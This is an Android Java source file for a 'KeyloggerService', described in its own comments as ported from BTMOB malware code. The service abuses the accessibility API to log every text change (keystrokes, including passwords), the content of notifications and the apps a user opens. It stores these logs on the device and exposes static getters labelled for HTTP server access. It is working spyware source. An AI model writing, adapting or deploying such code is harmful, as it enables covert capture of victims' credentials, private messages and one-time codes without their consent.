package com.security.ravan;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Notification;
import android.content.SharedPreferences;
import android.os.Build;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * Keylogger Service - Captures keystrokes, notifications, and app activity
 * via AccessibilityService
 * Ported from BTMOB AccessServices.java (keylogger/notification/activity
 * features only)
 */
public class KeyloggerService extends AccessibilityService {

    private static final String PREF_NAME = "ravan_keylogger";
    private static final String KEY_LOGS = "key_logs";
    private static final String KEY_NOTIFS = "notification_logs";
    private static final String KEY_ACTIVITY = "activity_logs";
    private static final int MAX_LOG_SIZE = 50000; // Max characters to store

    private static boolean isRunning = false;
    private String lastApp = "";

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        isRunning = true;

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                | AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED
                | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                | AccessibilityEvent.TYPE_VIEW_FOCUSED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
                | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        info.notificationTimeout = 100;
        setServiceInfo(info);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null)
            return;

        try {
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
            String timestamp = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());

            switch (event.getEventType()) {
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    // Keylogger
                    CharSequence text = event.getText() != null && !event.getText().isEmpty() ? event.getText().get(0)
                            : null;
                    if (text != null && text.length() > 0) {
                        String logEntry = "[" + timestamp + "] [" + packageName + "] " + text.toString();
                        appendLog(KEY_LOGS, logEntry);
                    }
                    break;

                case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                    // Notification logger
                    if (event.getParcelableData() instanceof Notification) {
                        Notification notification = (Notification) event.getParcelableData();
                        String title = "";
                        String notifText = "";

                        if (notification.extras != null) {
                            CharSequence titleCs = notification.extras.getCharSequence("android.title");
                            CharSequence textCs = notification.extras.getCharSequence("android.text");
                            title = titleCs != null ? titleCs.toString() : "";
                            notifText = textCs != null ? textCs.toString() : "";
                        }

                        if (!title.isEmpty() || !notifText.isEmpty()) {
                            String notifEntry = "[" + timestamp + "] [" + packageName + "] " +
                                    title + ": " + notifText;
                            appendLog(KEY_NOTIFS, notifEntry);
                        }
                    }
                    // Also try to get notification text from event
                    if (event.getText() != null && !event.getText().isEmpty()) {
                        StringBuilder notifText = new StringBuilder();
                        for (CharSequence cs : event.getText()) {
                            if (cs != null)
                                notifText.append(cs).append(" ");
                        }
                        if (notifText.length() > 0) {
                            String notifEntry = "[" + timestamp + "] [" + packageName + "] "
                                    + notifText.toString().trim();
                            appendLog(KEY_NOTIFS, notifEntry);
                        }
                    }
                    break;

                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                    // App activity tracker
                    if (!packageName.equals(lastApp)) {
                        lastApp = packageName;
                        String className = event.getClassName() != null ? event.getClassName().toString() : "unknown";
                        String activityEntry = "[" + timestamp + "] Opened: " + packageName + " / " + className;
                        appendLog(KEY_ACTIVITY, activityEntry);
                    }
                    break;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onInterrupt() {
        isRunning = false;
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        super.onDestroy();
    }

    private void appendLog(String key, String entry) {
        try {
            SharedPreferences prefs = getSharedPreferences(PREF_NAME, MODE_PRIVATE);
            String existing = prefs.getString(key, "");

            // Prepend new entry
            String newLog = entry + "\n" + existing;

            // Trim if too long
            if (newLog.length() > MAX_LOG_SIZE) {
                newLog = newLog.substring(0, MAX_LOG_SIZE);
            }

            prefs.edit().putString(key, newLog).apply();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // Static methods for HTTP server access
    public static boolean isServiceRunning() {
        return isRunning;
    }

    public static String getKeyLogs(android.content.Context context) {
        try {
            SharedPreferences prefs = context.getSharedPreferences(PREF_NAME, MODE_PRIVATE);
            return prefs.getString(KEY_LOGS, "No keylog data captured yet.");
        } catch (Exception e) {
            return "Error reading keylogs: " + e.getMessage();
        }
    }

    public static String getNotificationLogs(android.content.Context context) {
        try {
            SharedPreferences prefs = context.getSharedPreferences(PREF_NAME, MODE_PRIVATE);
            return prefs.getString(KEY_NOTIFS, "No notifications captured yet.");
        } catch (Exception e) {
            return "Error reading notifications: " + e.getMessage();
        }
    }

    public static String getActivityLogs(android.content.Context context) {
        try {
            SharedPreferences prefs = context.getSharedPreferences(PREF_NAME, MODE_PRIVATE);
            return prefs.getString(KEY_ACTIVITY, "No activity data captured yet.");
        } catch (Exception e) {
            return "Error reading activity logs: " + e.getMessage();
        }
    }

    public static void clearLogs(android.content.Context context, String type) {
        try {
            SharedPreferences prefs = context.getSharedPreferences(PREF_NAME, MODE_PRIVATE);
            SharedPreferences.Editor editor = prefs.edit();

            switch (type) {
                case "keys":
                    editor.putString(KEY_LOGS, "");
                    break;
                case "notifications":
                    editor.putString(KEY_NOTIFS, "");
                    break;
                case "activity":
                    editor.putString(KEY_ACTIVITY, "");
                    break;
                case "all":
                    editor.putString(KEY_LOGS, "");
                    editor.putString(KEY_NOTIFS, "");
                    editor.putString(KEY_ACTIVITY, "");
                    break;
            }

            editor.apply();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
